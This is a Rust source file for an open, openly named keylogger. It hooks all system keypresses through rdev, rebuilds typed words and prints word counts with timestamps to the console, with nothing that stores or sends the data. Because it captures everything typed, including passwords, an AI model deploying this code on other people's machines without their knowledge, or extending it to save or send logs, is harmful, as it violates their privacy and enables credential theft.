use std::collections::BTreeMap;

use chrono::prelude::*;
//use std::fs::OpenOptions;
//use std::io::Write;
use rdev::{EventType::*, Key::*};

/// Keylogger loop
pub fn log_keys() {
    // keep tack of cursor position using left and right arrow keys
    let mut cursor_pos = 0;
    // hold current word like this ["apple"]
    let mut key_buffer: Vec<String> = Vec::new();
    // hold all logged keys, separated in words, like this ["hello", "SPACE", "world!"]
    let mut words = BTreeMap::new();

    // blocking
    rdev::listen(move |event| {
        println!("logged so far: {:?}", words);
        // listen to keyPress only
        let key = match event.event_type {
            KeyPress(key) => Some(key),
            _ => None,
        };
        if let Some(key) = key {
            match key {
                Space | Return | Enter => {
                    words
                        .entry(format!("{:?}", key))
                        .and_modify(|count| *count += 1)
                        .or_insert(1);
                    cursor_pos = 0;
                    let new_word = key_buffer.join("");
                    key_buffer.clear();
                    words
                        .entry(new_word)
                        .and_modify(|count| *count += 1)
                        .or_insert(1);

                    let timestamp: DateTime<Local> = DateTime::from(event.time);

                    println!("[{:?}] Recorded word, so far: {:?}", timestamp, words);
                }
                LeftArrow => {
                    words.entry(format!("{:?}", key)).and_modify(|count| *count += 1).or_insert(1);
                    if cursor_pos >= 1 {
                        cursor_pos -= 1;
                    }
                }
                RightArrow => {
                    words.entry(format!("{:?}", key)).and_modify(|count| *count += 1).or_insert(1);
                    if cursor_pos < key_buffer.len() {
                        cursor_pos += 1;
                    };
                }
                Backspace | Delete => {
                    words.entry(format!("{:?}", key)).and_modify(|count| *count += 1).or_insert(1);
                    if cursor_pos >= 1 {
                        match key {
                            Backspace => {
                                cursor_pos -= 1;
                                key_buffer.remove(cursor_pos);
                            }
                            Delete => {
                                if cursor_pos != key_buffer.len() {
                                    key_buffer.remove(cursor_pos);
                                }
                            }
                            _ => {
                                panic!("Forgot a key to match?")
                            }
                        }
                    }
                }
                _ => {
                    println!("[pressed] key: {:?}, event.name: {:?}", key, event.name);
                    // println!("[pressed] {:?}", key);
                    if let Some(keycode) = event.name {
                        // add letters to the buffer, as we want to record words!
                        if keycode.bytes().last() < Some(127_u8)
                            && keycode.bytes().last() > Some(31_u8)
                        {
                            add_key_to_buffer(keycode, &mut key_buffer, cursor_pos).unwrap();
                            cursor_pos += 1;
                        } else {
                            // these must be non-letters
                        words.entry(format!("{:?}", key)).and_modify(|count| *count += 1).or_insert(1);
                        }
                    } else {
                        panic!("not recorded {:?}", key);
                    }
                }
            };
        }
    })
    .unwrap();
}

fn add_key_to_buffer(
    key: String,
    buffer: &mut Vec<String>,
    pos: usize,
) -> Result<(), Box<dyn std::error::Error>> {
    buffer.insert(pos, key);
    Ok(())
}
